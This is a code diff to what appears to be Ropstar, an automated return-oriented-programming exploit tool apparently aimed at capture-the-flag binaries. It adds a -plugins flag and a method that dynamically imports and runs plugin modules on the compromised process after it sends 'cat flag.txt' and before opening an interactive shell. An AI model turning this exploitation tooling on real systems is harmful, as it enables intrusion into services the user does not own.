@@ -5,11 +5,13 @@ import sys
 import os
 import re
 import argparse
+import inspect
 from leak import Leak
 from exploit import Exploit
 from utils import *
 from colorama import Fore, Back, Style
 import requests.packages.urllib3
+from importlib import import_module
 requests.packages.urllib3.disable_warnings()
 
 # Author: xct
@@ -26,7 +28,8 @@ class Ropstar():
 		parser.add_argument('-xor', help='xor payload with given byte')		
 		parser.add_argument('-win', help='specify win function address to call')	
 		parser.add_argument('-magic', help='magic string that needs to be send before the payload')
-		parser.add_argument('-remote_offset', help='get offset remotely via observing responses (often required with canaries)', action='store_true')																										
+		parser.add_argument('-remote_offset', help='get offset remotely via observing responses (often required with canaries)', action='store_true')
+		parser.add_argument('-plugins', help='run custom plugins')																											
 		self.args = parser.parse_args()
 		self.home = os.getlogin()
 		if self.home == 'root':
@@ -72,6 +75,18 @@ class Ropstar():
 			self.args.magic = self.args.magic.replace("\\n","")
 			self.magic_newline = True
 
+
+	def run_plugins(self, proc):
+		path = os.path.dirname(os.path.abspath(inspect.stack()[0][1]))+"/plugins/"
+		files = [f for f in os.listdir(path) if f.endswith(".py") and not f == "__init__.py"]
+		if len(files) > 0:
+			log.info("Executing plugins: "+','.join(files))
+			for file in files:
+				p, _ = file.rsplit('.', 1)
+				mod = import_module('plugins.'+p)
+				_class  = getattr(mod, 'Plugin')
+				plugin = _class(self.home)
+				plugin.run(proc)
 
 
 	def connect(self):
@@ -207,6 +222,8 @@ class Ropstar():
 			if len(out) > 0:
 				p.sendline("cat flag.txt")
 				flag = p.recvline()
+				if self.args.plugins:
+					self.run_plugins(p)
 				log.info('Time spent: '+str(round((time.time() - self.start_time),2))+'s')	
 				p.interactive()
 				return True
